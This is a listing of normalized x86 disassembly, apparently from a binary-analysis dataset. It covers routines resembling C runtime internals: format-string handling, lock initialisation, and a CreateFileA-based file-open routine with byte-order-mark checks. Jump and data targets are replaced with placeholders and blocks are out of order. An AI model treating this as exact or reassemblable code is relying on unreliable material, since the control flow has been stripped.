mov [ ebp - 0x278 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x274 ] eax
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x26c ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x224 ] edi
push eax
push [ ebp - 0x264 ]
lea eax [ ebp - 0x278 ]
push ebx
push eax
push [ rwxdata ]
call sub_40e714
pop ecx
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
call sub_4136cc
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x220 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x21c ] ecx
je r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x238 ] 0x0
mov eax [ ebp - 0x220 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x230 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x238 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x220 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call sub_4138e7
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x240 ] 0x0
inc eax
inc eax
inc eax
mov ecx [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x228 ]
call sub_415299
pop ecx
test eax eax
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x228 ]
call sub_415273
add esp 0xc
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_413447
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x254 ] eax
push 0x8
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rwxdata ]
call sub_40e714
pop ecx
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x228 ]
mov [ esi ] eax
mov ax [ ebp - 0x228 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x230 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x21c ] eax
jmp r-xdata
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x21c ]
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x264 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x21c ] ebx
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rwxdata ]
call sub_40e714
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x220 ]
cdq
push edx
push eax
push ebx
push edi
call sub_413c80
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x264 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push edi
push ebx
push 0x20
lea eax [ ebp - 0x228 ]
call sub_415273
add esp 0xc
or [ ebp - 0x228 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x270 ] eax
je r-xdata
pop esi
call sub_4136f0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x25c ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x21c ] esi
je r-xdata
cmp [ ebp - 0x228 ] 0x0
jl r-xdata
push [ ebp - 0x270 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0xc ]
call sub_415299
cmp [ ebp - 0x264 ] 0x0
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x264 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x270 ]
inc esi
push eax
inc esi
call sub_4138e7
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x21c ]
mov ecx [ ebp - 0x21c ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_415eb6
push 0x10
push r--data
call sub_40e30c
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415f4c
mov eax [ ebp - 0x1c ]
call sub_40e351
retn
mov esi edi
shl esi 0x2
mov eax [ rwxdata ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rwxdata ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_40c09d
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rwxdata ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rwxdata ]
push [ esi + eax ]
call sub_40fe78
pop ecx
mov eax [ rwxdata ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_415f55
mov edi edi
push esi
push edi
xor esi esi
mov edi rwxdata
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rwxdata ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_416de7
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rwxdata ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rwxdata ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_415fa0
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rwxdata
push edi
add esi 0x8
cmp esi rwxdata
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rwxdata
pop edi
push edi
call ebx
push edi
call sub_40fe78
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rwxdata
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_416026
push 0xc
push r--data
call sub_40e30c
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rwxdata ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rwxdata ]
cmp [ esi ] ebx
je r-xdata
call sub_410f77
push 0x1e
call sub_410da6
push 0xff
call sub_410a56
push 0x18
call sub_413447
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_40d7cc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_40e351
retn
push edi
call sub_40fe78
pop ecx
push 0xfa0
push edi
call sub_416de7
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_40fe78
pop ecx
call sub_40d7cc
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4160e0
mov eax [ ebp - 0x1c ]
sub_4160e9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rwxdata ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_416026
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_410a02
pop ecx
sub_41611c
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_421090
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_40d7df
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_40d7cc
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40d749
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rwxdata ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_417630
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_40d7df
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_40d7cc
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_40d7cc
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_40d7f2
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_40d7f2
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_40d7cc
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_4173eb
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rwxdata ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rwxdata ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_40fd27
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] bl
call sub_418c09
add esp 0xc
test eax eax
jne r-xdata
call sub_40d7df
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_40fd27
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_40ff06
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_40d7f2
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_41746c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_420cc9
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_418c09
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] rwxdata
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_4117d6
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_4117d6
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_40ff06
pop ecx
call sub_40d7cc
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_40fd27
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] rwxdata
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_40f420
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_40fd27
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_4117d6
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_4117d6
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_41683b
push 0x14
push r--data
call sub_40e30c
or [ ebp - 0x1c ] 0xffffffff
xor esi esi
mov [ ebp - 0x20 ] esi
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] esi
push [ ebp + 0x10 ]
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
call sub_41611c
add esp 0x14
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4168b7
mov edi [ ebp - 0x24 ]
cmp edi esi
je r-xdata
call sub_40d7cc
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_40d749
add esp 0x14
mov eax [ ebp - 0x1c ]
call sub_40d7cc
mov [ eax ] edi
jmp r-xdata
call sub_40e351
retn
or eax 0xffffffff
jmp r-xdata
sub_4168b7
cmp [ ebp - 0x20 ] esi
je r-xdata
retn
cmp [ ebp - 0x24 ] esi
je r-xdata
push [ ebp - 0x1c ]
call sub_417609
pop ecx
mov eax [ ebp - 0x1c ]
sar eax 0x5
mov ecx [ ebp - 0x1c ]
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + ecx + 0x4 ]
and [ eax ] 0xfe
sub_4168f1
push 0x14
push r--data
call sub_40e30c
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_40d7cc
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_40d749
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_40e351
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_41611c
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41698f
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_41698f
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_417609
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rwxdata ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_4169bd
mov edi edi
push ebp
mov ebp esp
push ecx
or [ ebp - 0x4 ] 0xffffffff
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4168f1
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
or eax 0xffffffff
leave
retn
sub_4169ef
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4168f1
add esp 0x18
pop ebp
retn
sub_416a0f
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_40c8c3
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4212b2
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx dx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx cx
mov si bx
jmp r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx cx [ edi ]
movzx ecx cx
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx cx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx cx
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
